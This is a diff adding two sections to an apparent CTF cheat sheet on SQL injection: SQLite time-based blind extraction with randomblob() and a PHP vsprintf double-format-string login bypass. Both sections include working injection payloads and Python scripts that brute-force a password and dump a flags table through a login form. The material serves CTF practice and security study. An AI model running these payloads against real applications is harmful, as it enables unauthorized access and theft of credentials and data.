@@ -20,6 +20,8 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 - [information_schema.processlist Race Condition Leak (SECUINSIDE 2017)](#information_schemaprocesslist-race-condition-leak-secuinside-2017)
 - [SQL BETWEEN Operator Tautology Bypass (DefCamp 2017)](#sql-between-operator-tautology-bypass-defcamp-2017)
 - [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017)
+- [SQLite Blind SQLi via randomblob() Timing (SECCON 2017)](#sqlite-blind-sqli-via-randomblob-timing-seccon-2017)
+- [vsprintf Double-Prepare Format String SQLi (AceBear 2018)](#vsprintf-double-prepare-format-string-sqli-acebear-2018)
 
 ---
 
@@ -399,5 +401,81 @@ Referer              # logged for referral tracking
 ```
 
 **Key insight:** `PROCEDURE ANALYSE()` is a MySQL-specific alternative to `information_schema` for schema enumeration — it analyzes the result set and returns column metadata. Host header injection is often overlooked by WAFs and developers because it's not a typical user input field, yet it frequently flows into SQL queries for logging, virtual hosting, or analytics.
+
+---
+
+## SQLite Blind SQLi via randomblob() Timing (SECCON 2017)
+
+**Pattern:** SQLite has no `SLEEP()` function. Use `randomblob(N)` as a time-based blind injection primitive -- generating a large random blob creates a measurable delay proportional to the argument size.
+
+```sql
+-- Basic time-based blind test: if the condition is true, randomblob() introduces delay
+admin' and 1=randomblob(300000000)--
+
+-- Character-by-character password extraction via LIKE:
+admin' and password like 'f%' and 1=randomblob(300000000)--
+admin' and password like 'fl%' and 1=randomblob(300000000)--
+admin' and password like 'fla%' and 1=randomblob(300000000)--
+admin' and password like 'flag%' and 1=randomblob(300000000)--
+```
+
+```python
+import requests
+import time
+import string
+
+url = "http://target/login"
+known = ""
+
+for pos in range(32):
+    for c in string.ascii_lowercase + string.digits + "_{}":
+        payload = f"admin' and password like '{known}{c}%' and 1=randomblob(300000000)--"
+        start = time.time()
+        requests.post(url, data={"username": payload, "password": "x"})
+        elapsed = time.time() - start
+        if elapsed > 2.0:  # threshold: randomblob(300M) takes ~2-3 seconds
+            known += c
+            print(f"Found: {known}")
+            break
+```
+
+**Key insight:** `randomblob()` generates random data proportional to the argument size, creating measurable delays. This is the SQLite equivalent of MySQL's `SLEEP()` or PostgreSQL's `pg_sleep()`. Adjust the argument (e.g., `300000000`) based on server performance to get a reliable timing difference. Other SQLite delay alternatives include `zeroblob()` and recursive CTEs, but `randomblob()` is the most reliable.
+
+---
+
+## vsprintf Double-Prepare Format String SQLi (AceBear 2018)
+
+**Pattern:** When user input passes through `vsprintf()` twice (once for formatting, once for query building), format specifiers like `%1$c` in the first pass produce characters that bypass string-level escaping. The integer `39` converts to ASCII `'` (single quote) via `%c`, defeating `mysqli_real_escape_string`.
+
+```text
+# Attack parameters:
+username=39&password=%1$c+or+1=1--+-
+
+# Server-side processing:
+# 1. Input is escaped: mysqli_real_escape_string has nothing to escape in "39" or "%1$c or 1=1-- -"
+# 2. vsprintf processes the query template:
+#    vsprintf("SELECT * FROM users WHERE user='%1$c or 1=1-- -' AND pass='%s'", [39, ...])
+# 3. %1$c converts argument 39 → chr(39) → ' (single quote)
+# 4. Result: WHERE user='' or 1=1-- -' AND pass='...'
+#    → authentication bypass
+```
+
+```python
+import requests
+
+# Step 1: Bypass login
+r = requests.post("http://target/login", data={
+    "username": "39",
+    "password": "%1$c or 1=1-- -"
+})
+
+# Step 2: Extract data with UNION
+r = requests.post("http://target/login", data={
+    "username": "39",
+    "password": "%1$c union select 1,group_concat(flag),3 from flags-- -"
+})
+```
+
+**Key insight:** `%c` in `vsprintf` converts an integer to a character, bypassing string-level escaping. If user input passes through `vsprintf` twice (once for formatting, once for query building), format specifiers in the first input become SQL injection vectors in the second pass. The key trick is sending `39` as one parameter (ASCII code for single quote) and `%1$c` as another to reference that parameter as a character. Look for PHP code that chains `sprintf`/`vsprintf` with query construction.
 
 ---
